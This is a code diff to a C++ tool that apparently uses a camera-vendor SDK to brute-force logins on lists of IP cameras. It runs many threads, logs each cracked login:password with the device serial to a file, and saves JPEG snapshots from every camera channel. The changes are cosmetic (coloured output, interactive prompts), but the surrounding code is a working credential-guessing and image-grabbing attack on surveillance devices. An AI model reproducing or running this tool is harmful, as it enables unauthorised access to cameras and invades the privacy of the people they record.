@@ -23,22 +23,40 @@ static std::vector<std::string> ips;
 int port = 8000;
 int threads_count = 500;
 
+#define RESET   "\033[0m"
+//#define BLACK   "\033[30m"      /* Black */
+#define RED     "\033[31m"      /* Red */
+#define GREEN   "\033[32m"      /* Green */
+#define YELLOW  "\033[33m"      /* Yellow */
+//#define BLUE    "\033[34m"      /* Blue */
+//#define MAGENTA "\033[35m"      /* Magenta */
+#define CYAN    "\033[36m"      /* Cyan */
+//#define WHITE   "\033[37m"      /* White */
+//#define BOLDBLACK   "\033[1m\033[30m"      /* Bold Black */
+//#define BOLDRED     "\033[1m\033[31m"      /* Bold Red */
+//#define BOLDGREEN   "\033[1m\033[32m"      /* Bold Green */
+//#define BOLDYELLOW  "\033[1m\033[33m"      /* Bold Yellow */
+//#define BOLDBLUE    "\033[1m\033[34m"      /* Bold Blue */
+//#define BOLDMAGENTA "\033[1m\033[35m"      /* Bold Magenta */
+//#define BOLDCYAN    "\033[1m\033[36m"      /* Bold Cyan */
+//#define BOLDWHITE   "\033[1m\033[37m"      /* Bold White */
+
 void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 device);
 
-int main(int argc, char **argv) {
-    //TODO: check type
-    if (argv[1] and argv[2]) {
-        port = atoi(argv[1]);
-        threads_count = atoi(argv[2]);
-    }
+int main() {
+    int a1;
+    std::cout << GREEN << "Enter port: " << RESET;
+    if (std::cin >> a1)
+        port = a1;
 
-    std::cout << "Port: " << port << std::endl;;
-    std::cout << "Threads: " << threads_count << std::endl;;
-
+    int a2;
+    std::cout << GREEN << "Enter threads: " << RESET;
+    if (std::cin >> a2)
+        threads_count = a2;
 
     mkdir("./pictures", 0655);
     if (!NET_DVR_Init()) {
-        std::cout << "Error NET_DVR_Init" << std::endl;;
+        std::cout << RESET << RED << "Error NET_DVR_Init" << RESET << std::endl;;
         return 0;
     }
     NET_DVR_SetConnectTime();
@@ -58,9 +76,6 @@ int main(int argc, char **argv) {
         threads[i].join();
 
     NET_DVR_Cleanup();
-
-    std::cout << "Press enter to continue ..." << std::endl;;
-    std::cin.get();
     return 0;
 }
 
@@ -82,7 +97,7 @@ void bruteforce() {
 
 void brute(std::string ip) {
     if (!validateIpAddress(ip)) {
-        std::cout << ip << " not ip address" << std::endl;
+        std::cout << RED << ip << " not ip address" << RESET << std::endl;
         return;
     }
 
@@ -104,10 +119,11 @@ void brute(std::string ip) {
         UserID = NET_DVR_Login_V30((char *) host, (const WORD) port, (char *) login, (char *) password,
                                    &device_info);
 
-        std::cout << "Trying " << login << ":" << password << " for " << ip << ":" << port << std::endl;
+        std::cout << CYAN << "Trying " << login << ":" << password << " for " << ip << ":" << port << RESET
+                  << std::endl;
         if (UserID != -1) {
-            std::cout << "\t\t\t\t\t\t\t\t" << login << ":" << password << "@" << ip << ":" << port
-                      << std::endl;
+            std::cout << GREEN << login << ":" << password << "@" << ip << ":" << port
+                      << RESET << std::endl;
             std::ofstream outfile;
             outfile.open("output.txt", std::ios_base::app);
             outfile << device_info.sSerialNumber << "\t\t" << login << ":" << password << "@" << ip << ":" << port
@@ -115,8 +131,6 @@ void brute(std::string ip) {
             loadPhotos(ip, UserID, device_info);
             NET_DVR_Logout(UserID);
             return;
-        } else {
-            std::cout << "Could not sign in." << std::endl;
         }
     }
 }
@@ -130,9 +144,9 @@ void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEIN
         params.wPicSize = 0;
         if (NET_DVR_CaptureJPEGPicture((LONG) user_id, channel, &params, (char *) filename.c_str())) {
             chmod(filename.c_str(), 0655);
-            std::cout << "\t\t\t\t\t\t\t\tGetting a photo (channel " << channel << ") from the camera " << ip << ":"
+            std::cout << YELLOW << "Getting a photo (channel " << channel << ") from the camera " << ip << ":"
                       << port << "..."
-                      << std::endl;
+                      << RESET << std::endl;
         }
     }
 }
